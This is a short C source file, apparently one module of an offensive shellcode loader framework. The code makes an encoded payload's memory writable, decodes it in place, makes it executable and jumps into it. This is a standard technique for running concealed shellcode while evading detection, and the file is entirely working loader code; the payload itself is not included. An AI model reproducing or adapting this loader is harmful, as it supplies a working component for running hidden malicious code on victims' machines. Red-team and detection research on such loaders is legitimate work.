/* MODULE: CARRIER
 * TYPE: change_rw_rx
 * DESC: Uses existing memory (in-place), Changes to RW, Decodes, Changes to RX, Executes.
 * CONST: Requires payload to be in a writable/changeable section.
 */
#include "../header/definitions.h"
#include <stdio.h>

int carrier() {
    DWORD result;
    char *dest = (char*)supermega_payload; // defined in payload.h

    // 1. Make RW
    if (!MyVirtualProtect(dest, PAYLOAD_LEN, p_RW, &result)) {
        return 2;
    }

    // 2. Decode (In-Place)
    decode_payload(dest, PAYLOAD_LEN);

    // 3. Make RX
    if (!MyVirtualProtect(dest, PAYLOAD_LEN, p_RX, &result)) {
        return 2;
    }

    ARTIFACT_CHECKPOINT("Launching");
    // 4. Execute
    (*(void(*)())(dest))();

    return 0;
}
